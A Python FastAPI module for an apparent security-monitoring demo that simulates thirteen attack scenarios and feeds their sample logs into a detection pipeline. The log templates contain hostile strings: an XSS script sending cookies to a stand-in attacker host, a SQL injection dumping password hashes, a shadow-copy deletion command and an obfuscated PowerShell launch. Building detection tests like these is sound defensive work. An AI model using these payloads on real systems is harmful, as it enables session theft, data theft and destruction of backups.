from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from typing import List, Dict, Any, Optional
from datetime import datetime, timezone
import uuid

from app.database.session import get_db
from app.models.events import SecurityEvent, DetectionResult
from app.models.incidents import Incident, IncidentEvent
from app.models.response import ResponseAction
from app.schemas.events import EventIngest
from app.services.event_service import EventService
from app.services.agents_service import black_agent, dark_agent, red_agent
from app.websocket.manager import ws_manager

router = APIRouter(prefix="/attacks", tags=["Attack Scenarios & Simulations"])

TARGET_EXFIL_FILES = [
    {
        "filename": "recon_targets.txt",
        "size": 482,
        "content": (
            "# TARGET SUBNET RECONNAISSANCE MAP\n"
            "10.0.0.1      GATEWAY-PRIMARY     STATUS: UP   PORTS: 22,80,443\n"
            "10.0.0.10     PROD-CORE-01        STATUS: UP   PORTS: 80,443,8000\n"
            "10.0.0.15     DB-CLUSTER-MASTER   STATUS: UP   PORTS: 3306,5432\n"
            "10.0.0.88     DEV-WORKSTATION-04  STATUS: UP   PORTS: 22,8080\n"
            "192.168.1.100 BORDER-ROUTER-EDGE  STATUS: UP   PORTS: 53,443"
        )
    },
    {
        "filename": "customer_records.csv",
        "size": 512,
        "content": (
            "account_id,org_name,tier,region,active_tokens,last_access\n"
            "CUST-9021,Apex Global Cyber,Enterprise,US-East,14,2026-11-23T20:11:00Z\n"
            "CUST-8842,Vanguard Defense,Gov-Cloud,EU-Central,8,2026-11-23T21:40:12Z\n"
            "CUST-7719,Helios Energy Corp,Enterprise,AP-South,22,2026-11-23T19:05:44Z\n"
            "CUST-6104,Titan Aerospace,Federal,US-West,5,2026-11-23T22:01:19Z\n"
            "CUST-5290,Nordic Financial Group,Tier-1,EU-North,19,2026-11-23T18:22:50Z"
        )
    },
    {
        "filename": "api_endpoints.conf",
        "size": 345,
        "content": (
            "[gateway_routing]\n"
            "api_version = 2.4.0\n"
            "internal_prefix = /api/v1\n"
            "auth_service = https://auth.internal.net:8000/verify\n"
            "telemetry_stream = wss://telemetry.internal.net:8000/ws\n"
            "database_cluster = tcp://10.0.0.15:5432/cybersentinel\n"
            "encryption_mode = AES-256-GCM\n"
            "session_timeout_sec = 3600"
        )
    },
    {
        "filename": "system_architecture.json",
        "size": 418,
        "content": (
            "{\n"
            '  "platform": "CYBER BLACK DEFENSE MATRIX",\n'
            '  "defense_nodes": {\n'
            '    "agent_01": "Black Agent Perimeter Shield (9 Ports Armed)",\n'
            '    "agent_02": "Dark Agent Deception Core (Honeypot Decoy)",\n'
            '    "engine": "AMTIE 5-Layer Anomaly & Threat Detection"\n'
            '  },\n'
            '  "core_services": ["auth", "telemetry", "incident_triage", "response_automation"],\n'
            '  "isolated_vlans": ["VLAN-100-PROD", "VLAN-200-DB", "VLAN-999-HONEYNET"]\n'
            "}"
        )
    },
    {
        "filename": "audit_log_2026.txt",
        "size": 520,
        "content": (
            "2026-11-23 21:55:04 [INFO] SOC Kernel boot complete. All 9 perimeter ports armored.\n"
            "2026-11-23 22:01:18 [SEC_EVENT] Ingress scan detected from subnet 198.51.100.0/24.\n"
            "2026-11-23 22:10:45 [BLOCK] Gateway firewall dropped 42 SYN packets on port 22.\n"
            "2026-11-23 22:15:30 [AUTH] Administrator session established: Lead SOC Architect mani02.\n"
            "2026-11-23 22:20:00 [HEALTH] AMTIE 5-layer anomaly inference running at sub-millisecond latency."
        )
    }
]

@router.get("/files")
def get_target_files():
    """Returns the 5 demo exfiltration target files."""
    return TARGET_EXFIL_FILES

ATTACK_SCENARIOS = [
    {
        "id": "att-0",
        "title": "Scenario 0: Target Repository Files Exfiltration",
        "severity": "Critical",
        "category": "Exfiltration",
        "mitre_id": "T1041",
        "mitre_technique": "Exfiltration Over C2 Channel",
        "mitre_tactic": "Exfiltration",
        "target_asset": "10.0.0.15 (Central Target Repository)",
        "source_ip": "198.51.100.88",
        "destination_ip": "10.0.0.15",
        "port": 443,
        "protocol": "TCP",
        "is_core": True,
        "description": "Exfiltrates all 5 corporate target data files from the repository when perimeter shield is disabled.",
        "kill_chain_stage": "Actions on Objectives",
        "expected_detection": "Layer 1 Large Egress + Layer 2 Anomaly + Layer 3 Exfiltration Classifier",
        "recommended_action": "isolate_host",
        "target_entity": "10.0.0.15",
        "containment_guidance": "Sever outbound sessions and verify integrity of internal file repositories.",
        "raw_log_template": "FLOW TCP src=10.0.0.15:443 dst=198.51.100.88:51224 BYTES_IN=1200 BYTES_OUT=32000000 PROTO=TCP",
        "normalized_payload": {
            "failed_attempts": 0,
            "bytes_in": 1200,
            "bytes_out": 32000000,
            "dst_port": 443,
            "distinct_ports_scanned": 1
        }
    },
    {
        "id": "ssh-brute-force",
        "title": "Scenario 1: SSH Brute Force Campaign",
        "severity": "Critical",
        "category": "Authentication",
        "mitre_id": "T1110.001",
        "mitre_technique": "Brute Force: Password Guessing",
        "mitre_tactic": "Credential Access",
        "target_asset": "10.0.0.10 (Core Linux Server)",
        "source_ip": "185.220.101.5",
        "destination_ip": "10.0.0.10",
        "port": 22,
        "protocol": "TCP",
        "is_core": True,
        "description": "15 consecutive failed authentication attempts targeting root account within 60 seconds from external IP 185.220.101.5 on SSH port 22.",
        "kill_chain_stage": "Credential Access",
        "expected_detection": "Layer 1 Rule Match (Failed Attempts >= 3) + Layer 2 Anomaly + Layer 3 XGBoost (Brute Force 94%+) + Layer 5 Calibrated Risk (92+/100)",
        "recommended_action": "block_ip",
        "target_entity": "185.220.101.5",
        "containment_guidance": "Add firewall drop rule for 185.220.101.5 at perimeter gateway and enforce public-key only auth.",
        "raw_log_template": "Nov 22 19:15:02 soc-prod-srv sshd[2841]: Failed password for invalid user root from 185.220.101.5 port 54321 ssh2",
        "normalized_payload": {
            "failed_attempts": 15,
            "is_root": True,
            "bytes_in": 1200,
            "bytes_out": 850,
            "dst_port": 22
        }
    },
    {
        "id": "internal-port-scan",
        "title": "Scenario 2: Internal Lateral Port Scanning",
        "severity": "High",
        "category": "Network",
        "mitre_id": "T1046",
        "mitre_technique": "Network Service Scanning",
        "mitre_tactic": "Discovery",
        "target_asset": "10.0.0.0/24 Subnet",
        "source_ip": "10.0.0.45",
        "destination_ip": "10.0.0.1",
        "port": 135,
        "protocol": "TCP",
        "is_core": True,
        "description": "Compromised internal workstation sweeps 19 distinct ports across internal subnet hosts (10.0.0.1 - 10.0.0.24) detecting open management services (SSH, RDP, SMB, MySQL).",
        "kill_chain_stage": "Discovery",
        "expected_detection": "Layer 1 Heuristic (Distinct Ports >= 10) + Layer 2 Anomaly (Extreme Deviation) + Layer 3 Port Scan Classifier (91%+)",
        "recommended_action": "isolate_host",
        "target_entity": "10.0.0.45",
        "containment_guidance": "Isolate workstation 10.0.0.45 from corporate VLAN to prevent further lateral reconnaissance.",
        "raw_log_template": "FLOW TCP src=10.0.0.45:49182 dst=10.0.0.1:135 PROTO=TCP PORTS_SCANNED=19 ACTION=REJECT_SYN",
        "normalized_payload": {
            "failed_attempts": 0,
            "distinct_ports_scanned": 19,
            "bytes_in": 3500,
            "bytes_out": 2200,
            "dst_port": 135
        }
    },
    {
        "id": "data-exfiltration",
        "title": "Scenario 3: Encrypted C2 Data Exfiltration",
        "severity": "Critical",
        "category": "Network",
        "mitre_id": "T1048",
        "mitre_technique": "Exfiltration Over Alternative Protocol",
        "mitre_tactic": "Exfiltration",
        "target_asset": "10.0.0.15 (Database Server)",
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.23",
        "port": 443,
        "protocol": "TCP",
        "is_core": True,
        "description": "Massive outbound transfer spike of 24.8 MB transmitted to foreign bulletproof host 198.51.100.23 with minimal inbound traffic (500 bytes). Extreme volumetric ratio anomaly.",
        "kill_chain_stage": "Exfiltration",
        "expected_detection": "Layer 1 Large Egress Rule (>10MB) + Layer 2 Volume Anomaly + Layer 3 Data Exfiltration Classifier + High Risk Incident",
        "recommended_action": "block_ip",
        "target_entity": "198.51.100.23",
        "containment_guidance": "Terminate TCP sessions to 198.51.100.23 and isolate database host 10.0.0.15 for forensic disk imaging.",
        "raw_log_template": "FLOW TCP src=10.0.0.15:52190 dst=198.51.100.23:443 BYTES_IN=500 BYTES_OUT=24800000 DURATION=14s PROTO=TCP",
        "normalized_payload": {
            "failed_attempts": 0,
            "bytes_in": 500,
            "bytes_out": 24800000,
            "dst_port": 443,
            "distinct_ports_scanned": 1
        }
    },
    {
        "id": "privilege-escalation",
        "title": "Scenario 4: Unauthorized Privilege Escalation",
        "severity": "Critical",
        "category": "Privilege",
        "mitre_id": "T1548.003",
        "mitre_technique": "Abuse Elevation Control Mechanism: Sudo",
        "mitre_tactic": "Privilege Escalation",
        "target_asset": "10.0.0.10 (Production Server)",
        "source_ip": "10.0.0.88",
        "destination_ip": "10.0.0.10",
        "port": 22,
        "protocol": "TCP",
        "is_core": True,
        "description": "Compromised user account 'guest_dev' attempts multiple unauthorized sudo commands with incorrect passwords seeking root shell execution on production server.",
        "kill_chain_stage": "Privilege Escalation",
        "expected_detection": "Layer 1 Sudo Privilege Violation + Layer 3 Privilege Escalation Classifier + Session Revocation Recommendation",
        "recommended_action": "revoke_session",
        "target_entity": "guest_dev",
        "containment_guidance": "Revoke active Kerberos and OAuth sessions for guest_dev and trigger emergency credential rotation.",
        "raw_log_template": "Nov 22 19:22:14 soc-prod-srv sudo: guest_dev : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/guest_dev ; USER=root ; COMMAND=/bin/bash",
        "normalized_payload": {
            "failed_attempts": 3,
            "is_root": True,
            "bytes_in": 800,
            "bytes_out": 1400,
            "dst_port": 22
        }
    },
    {
        "id": "sql-injection",
        "title": "Scenario 5: Web Application SQL Injection (SQLi)",
        "severity": "High",
        "category": "Web Application",
        "mitre_id": "T1190",
        "mitre_technique": "Exploit Public-Facing Application",
        "mitre_tactic": "Initial Access",
        "target_asset": "10.0.0.20 (Web Application Gateway)",
        "source_ip": "203.0.113.88",
        "destination_ip": "10.0.0.20",
        "port": 443,
        "protocol": "HTTPS",
        "is_core": False,
        "description": "Adversary injects UNION SELECT SQL syntax into authentication search query to dump table schemas and password hashes from database backend.",
        "kill_chain_stage": "Initial Access",
        "expected_detection": "Pattern Match (UNION SELECT / SQL Injection) + Anomaly Detection + Supervised Threat Score",
        "recommended_action": "block_ip",
        "target_entity": "203.0.113.88",
        "containment_guidance": "Deploy WAF rate-limit and signature drop for IP 203.0.113.88; audit ORM parameterization.",
        "raw_log_template": "GET /api/v1/users?query=1'+UNION+SELECT+1,username,password_hash+FROM+admin_users-- HTTP/1.1 500 Internal Error from 203.0.113.88",
        "normalized_payload": {
            "failed_attempts": 0,
            "bytes_in": 4500,
            "bytes_out": 12000,
            "dst_port": 443
        }
    },
    {
        "id": "ransomware-pre-execution",
        "title": "Scenario 6: Ransomware Pre-Execution & Shadow Copy Deletion",
        "severity": "Critical",
        "category": "Malware",
        "mitre_id": "T1486",
        "mitre_technique": "Data Encrypted for Impact & Inhibit Recovery",
        "mitre_tactic": "Impact",
        "target_asset": "10.0.0.50 (Finance File Server)",
        "source_ip": "10.0.0.50",
        "destination_ip": "10.0.0.50",
        "port": 445,
        "protocol": "SMB",
        "is_core": False,
        "description": "Adversary script invokes `vssadmin.exe delete shadows /all /quiet` followed by `wbadmin delete catalog` to destroy restore points before deploying ransomware encryptor.",
        "kill_chain_stage": "Impact",
        "expected_detection": "Malware / Ransomware Heuristic + High Risk Score + Immediate Host Isolation Recommendation",
        "recommended_action": "isolate_host",
        "target_entity": "10.0.0.50",
        "containment_guidance": "Isolate Finance Server 10.0.0.50 immediately to prevent enterprise network share encryption.",
        "raw_log_template": "EventID: 4688 Process Creation: vssadmin.exe delete shadows /all /quiet Parent: cmd.exe User: SYSTEM Host: FS-FINANCE-01",
        "normalized_payload": {
            "failed_attempts": 0,
            "is_root": True,
            "bytes_in": 1200,
            "bytes_out": 2500,
            "dst_port": 445
        }
    },
    {
        "id": "kerberoasting-movement",
        "title": "Scenario 7: Kerberoasting & Service Ticket Harvesting",
        "severity": "High",
        "category": "Authentication",
        "mitre_id": "T1558.003",
        "mitre_technique": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "mitre_tactic": "Credential Access",
        "target_asset": "10.0.0.5 (Domain Controller)",
        "source_ip": "10.0.0.112",
        "destination_ip": "10.0.0.5",
        "port": 88,
        "protocol": "TCP",
        "is_core": False,
        "description": "Abnormal volume of Kerberos TGS requests for service principal names (MSSQLSvc, HTTP) from non-admin workstation to extract tickets for offline password cracking.",
        "kill_chain_stage": "Credential Access",
        "expected_detection": "Kerberos TGS Anomaly + Credential Access Classification + Account Password Reset Staged",
        "recommended_action": "reset_password",
        "target_entity": "svc_mssql_admin",
        "containment_guidance": "Rotate passwords on targeted service accounts and deploy AES-256 Kerberos encryption.",
        "raw_log_template": "EventID: 4769 A Kerberos service ticket was requested. Service: MSSQLSvc/db01.corp:1433 Client: 10.0.0.112 Encryption: 0x17 (RC4-HMAC)",
        "normalized_payload": {
            "failed_attempts": 0,
            "bytes_in": 6200,
            "bytes_out": 15000,
            "dst_port": 88
        }
    },
    {
        "id": "ddos-syn-flood",
        "title": "Scenario 8: Volumetric DDoS SYN Flood Attack",
        "severity": "Critical",
        "category": "Denial of Service",
        "mitre_id": "T1498",
        "mitre_technique": "Network Denial of Service",
        "mitre_tactic": "Impact",
        "target_asset": "10.0.0.1 (Perimeter Gateway)",
        "source_ip": "198.51.100.150",
        "destination_ip": "10.0.0.1",
        "port": 443,
        "protocol": "TCP",
        "is_core": False,
        "description": "High-intensity TCP SYN flood of 65,000 packets/sec saturating gateway state tables, threatening service availability across core enterprise applications.",
        "kill_chain_stage": "Impact",
        "expected_detection": "Volumetric Denial of Service Rule + Peak Anomaly Deviation + Automated Incident Escalation",
        "recommended_action": "block_ip",
        "target_entity": "198.51.100.0/24",
        "containment_guidance": "Engage perimeter scrubbing center and activate SYN proxy cookies on perimeter routers.",
        "raw_log_template": "FLOW TCP src=198.51.100.150:41200 dst=10.0.0.1:443 PACKETS=65000 FLAGS=SYN_ONLY ACTION=RATE_LIMIT_DROP",
        "normalized_payload": {
            "failed_attempts": 0,
            "bytes_in": 15000000,
            "bytes_out": 200,
            "dst_port": 443
        }
    },
    {
        "id": "xss-session-hijacking",
        "title": "Scenario 9: Stored XSS & Admin Session Hijacking",
        "severity": "Medium",
        "category": "Web Application",
        "mitre_id": "T1059.007",
        "mitre_technique": "Command and Scripting: JavaScript",
        "mitre_tactic": "Execution",
        "target_asset": "10.0.0.20 (Web Application)",
        "source_ip": "198.51.100.77",
        "destination_ip": "10.0.0.20",
        "port": 443,
        "protocol": "HTTPS",
        "is_core": False,
        "description": "Adversary injects malicious script payload into public feedback field designed to execute in admin browser context and exfiltrate authentication cookies.",
        "kill_chain_stage": "Execution",
        "expected_detection": "Cross-Site Scripting Pattern Match + Token Revocation Recommendation",
        "recommended_action": "revoke_session",
        "target_entity": "admin_portal_session",
        "containment_guidance": "Invalidate active admin web sessions and implement Content-Security-Policy (CSP) headers.",
        "raw_log_template": "POST /feedback HTTP/1.1 Host: app.corp Payload: <script>document.location='http://attacker.c2/exfil?c='+document.cookie</script> from 198.51.100.77",
        "normalized_payload": {
            "failed_attempts": 0,
            "bytes_in": 2800,
            "bytes_out": 1200,
            "dst_port": 443
        }
    },
    {
        "id": "lotl-powershell",
        "title": "Scenario 10: Living-Off-The-Land (LotL) PowerShell Execution",
        "severity": "High",
        "category": "Execution",
        "mitre_id": "T1059.001",
        "mitre_technique": "Command and Scripting: PowerShell",
        "mitre_tactic": "Execution",
        "target_asset": "10.0.0.33 (HR Workstation)",
        "source_ip": "10.0.0.33",
        "destination_ip": "10.0.0.33",
        "port": 445,
        "protocol": "SMB",
        "is_core": False,
        "description": "Obfuscated Base64 PowerShell execution bypasses execution policy, spawning in-memory download cradle without writing executable files to disk.",
        "kill_chain_stage": "Defense Evasion",
        "expected_detection": "PowerShell Obfuscation Signature + Memory Execution Anomaly + Host Isolation Staged",
        "recommended_action": "isolate_host",
        "target_entity": "10.0.0.33",
        "containment_guidance": "Isolate HR Workstation 10.0.0.33 and kill anomalous PowerShell child processes.",
        "raw_log_template": "EventID: 4104 PowerShell ScriptBlock Execution: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc SQBFAFgA...",
        "normalized_payload": {
            "failed_attempts": 0,
            "is_root": False,
            "bytes_in": 1500,
            "bytes_out": 4200,
            "dst_port": 445
        }
    },
    {
        "id": "dns-tunneling-exfil",
        "title": "Scenario 11: DNS Tunneling Out-of-Band Exfiltration",
        "severity": "High",
        "category": "Exfiltration",
        "mitre_id": "T1071.004",
        "mitre_technique": "Application Layer Protocol: DNS",
        "mitre_tactic": "Command and Control",
        "target_asset": "10.0.0.12 (R&D Linux Host)",
        "source_ip": "10.0.0.12",
        "destination_ip": "198.51.100.99",
        "port": 53,
        "protocol": "UDP",
        "is_core": False,
        "description": "Continuous rapid stream of high-entropy TXT and A record DNS lookups encoding company proprietary source code to rogue external nameserver.",
        "kill_chain_stage": "Exfiltration",
        "expected_detection": "DNS Tunneling Protocol Deviation + Out-of-Band Exfiltration Anomaly + Domain Sinkhole Action",
        "recommended_action": "block_ip",
        "target_entity": "198.51.100.99",
        "containment_guidance": "Block adversary external DNS nameserver 198.51.100.99 and sinkhole queried subdomains.",
        "raw_log_template": "DNS QUERY src=10.0.0.12:51204 dst=198.51.100.99:53 QNAME=7a8b9c.exfil.data.c2-dns.org QTYPE=TXT DURATION=0.02s",
        "normalized_payload": {
            "failed_attempts": 0,
            "bytes_in": 1200,
            "bytes_out": 8500000,
            "dst_port": 53
        }
    },
    {
        "id": "insider-policy-tampering",
        "title": "Scenario 12: Malicious Insider Security Policy Tampering",
        "severity": "High",
        "category": "System",
        "mitre_id": "T1565.001",
        "mitre_technique": "Data Manipulation: Stored Data Manipulation",
        "mitre_tactic": "Defense Evasion",
        "target_asset": "10.0.0.10 (Core Production Server)",
        "source_ip": "10.0.0.190",
        "destination_ip": "10.0.0.10",
        "port": 22,
        "protocol": "TCP",
        "is_core": False,
        "description": "Off-hours (03:15 AM) unauthorized modification of `/etc/pam.d/common-auth` and disabling of auditd logging service by administrative account.",
        "kill_chain_stage": "Defense Evasion",
        "expected_detection": "Unauthorized System Config Manipulation + High Risk Intel Score + Snapshot Backup Triggered",
        "recommended_action": "revoke_session",
        "target_entity": "admin_operator",
        "containment_guidance": "Revoke administrator session, lock account, and revert system files to last verified backup.",
        "raw_log_template": "AUDIT: type=CONFIG_CHANGE msg=audit(1732274102.120:84): op=disable_auditd auid=1000 res=1 comm=systemctl user=admin_operator",
        "normalized_payload": {
            "failed_attempts": 0,
            "is_root": True,
            "bytes_in": 800,
            "bytes_out": 1200,
            "dst_port": 22
        }
    }
]

@router.get("/scenarios", response_model=List[Dict[str, Any]])
def list_attack_scenarios():
    """
    Returns the complete catalog of real-world attack scenarios available for demonstration.
    """
    return ATTACK_SCENARIOS

@router.post("/simulate/{scenario_id}", response_model=Dict[str, Any])
async def simulate_attack_scenario(scenario_id: str, request: Request, db: Session = Depends(get_db)):
    """
    Executes a real-world cyber attack simulation through the AMTIE detection pipeline.
    Demonstrates Black Agent (Perimeter & Port Defense) and Red Agent (Deception & Counter-Strike).
    """
    scenario = next((s for s in ATTACK_SCENARIOS if s["id"] == scenario_id), None)
    if not scenario:
        raise HTTPException(status_code=404, detail=f"Attack scenario '{scenario_id}' not found.")

    client_ip = request.headers.get("x-forwarded-for") or (request.client.host if request.client else scenario["source_ip"])
    user_agent = request.headers.get("user-agent", "Unknown Mobile/Offensive Client")

    # Check if Dark Agent is Active (Overrides Black Agent and locks attacker device)
    is_dark_active = dark_agent.is_active

    if is_dark_active:
        # Black Agent stands down to allow attacker into the Dark Agent trap
        black_defense = black_agent.record_defense(scenario, client_ip, bypassed_by_dark=True)
        # Dark Agent serves honeypot decoy data and locks device browser
        dark_response = dark_agent.lock_attacker_device(scenario, client_ip, user_agent)
    elif not black_agent.is_active:
        # Black Agent is manually switched OFF: attack succeeds and demo data is sent to attacker!
        black_defense = {
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.now(timezone.utc).strftime("%H:%M:%S UTC"),
            "target_port": scenario.get("port", 80),
            "blocked_ip": client_ip,
            "attack_type": scenario.get("title", "Attack"),
            "mitre_id": scenario.get("mitre_id", "T1000"),
            "action": "SHIELD_OFFLINE_PENETRATION_PERMITTED",
            "firewall_rule": "NONE (Black Agent Shield Deactivated by Operator)",
            "defense_layer": "Perimeter Disarmed"
        }
        dark_response = {
            "dummy_data": {
                "status": "PENETRATION_SUCCESSFUL_PERIMETER_DOWN",
                "files_count": len(TARGET_EXFIL_FILES),
                "files": [f["filename"] for f in TARGET_EXFIL_FILES]
            },
            "files": TARGET_EXFIL_FILES,
            "footprint": {
                "attacker_ip": client_ip,
                "target_port": scenario.get("port", 80),
                "attack_vector": scenario.get("title", "Attack"),
                "trace_status": "PERIMETER_UNARMED"
            }
        }
    else:
        # Black Agent Active: Perimeter defense drops and neutralizes attack
        black_defense = black_agent.record_defense(scenario, client_ip, bypassed_by_dark=False)
        dark_response = None

    # Create ingestion payload
    ingest_payload = EventIngest(
        source_type="linux_auth" if scenario["category"] in ["Authentication", "Privilege"] else "network_flow",
        source_ip=scenario["source_ip"],
        destination_ip=scenario["destination_ip"],
        source_port=54321,
        destination_port=scenario["port"],
        protocol=scenario["protocol"],
        event_category=scenario["category"],
        severity=scenario["severity"],
        raw_log=scenario["raw_log_template"],
        normalized_payload=scenario["normalized_payload"],
        is_simulated=True
    )

    # Ingest event through EventService & AMTIEEngine
    event = await EventService.ingest_single_event(ingest_payload, db)
    det = event.detection_result

    # Check if an incident was generated or associated
    incident_link = db.query(IncidentEvent).filter(IncidentEvent.event_id == event.id).first()
    incident_data = None
    if incident_link:
        inc = db.query(Incident).filter(Incident.id == incident_link.incident_id).first()
        if inc:
            incident_data = {
                "id": inc.id,
                "incident_code": inc.incident_code,
                "title": inc.title,
                "severity": inc.severity,
                "status": inc.status
            }

    # Automatically stage recommended containment action in Response Center
    staged_action_id = None
    try:
        new_action = ResponseAction(
            id=str(uuid.uuid4()),
            incident_id=incident_data["id"] if incident_data else None,
            action_type=scenario["recommended_action"],
            target_entity=scenario["target_entity"],
            parameters_json={"scenario_id": scenario["id"], "mode": "simulation"},
            status="pending_approval",
            recommended_by="AMTIE AI Security Engine",
            rollback_instructions=f"Restore connectivity or unblock entity {scenario['target_entity']}"
        )
        db.add(new_action)
        db.commit()
        staged_action_id = new_action.id
    except Exception:
        db.rollback()

    # Broadcast Dual-Agent Action over WebSocket
    try:
        await ws_manager.broadcast_event({
            "type": "DUAL_AGENT_ACTION",
            "is_dark_active": is_dark_active,
            "black_agent": black_defense,
            "dark_agent": dark_response,
            "red_agent": dark_response
        })
    except Exception:
        pass

    return {
        "status": "success",
        "scenario_id": scenario["id"],
        "scenario_title": scenario["title"],
        "event_id": event.id,
        "event_hash": event.event_hash,
        "timestamp": event.timestamp.isoformat(),
        "severity": det.severity if det else scenario["severity"],
        "risk_score": det.final_risk_score if det else 85.0,
        "attack_class": det.layer3_class if det else scenario["category"],
        "confidence": det.layer3_confidence if det else 0.95,
        "layer1_rules": det.layer1_rule_hits if det else [],
        "layer2_anomaly_score": det.layer2_anomaly_score if det else 0.05,
        "layer3_class": det.layer3_class if det else "Attack",
        "layer4_correlation_id": det.layer4_correlation_id if det else None,
        "incident": incident_data,
        "recommended_action": {
            "action_id": staged_action_id,
            "action_type": scenario["recommended_action"],
            "target_entity": scenario["target_entity"],
            "guidance": scenario["containment_guidance"]
        },
        "mitre": {
            "id": scenario["mitre_id"],
            "technique": scenario["mitre_technique"],
            "tactic": scenario["mitre_tactic"]
        },
        "black_agent": black_defense,
        "dark_agent": dark_response,
        "red_agent": dark_response
    }
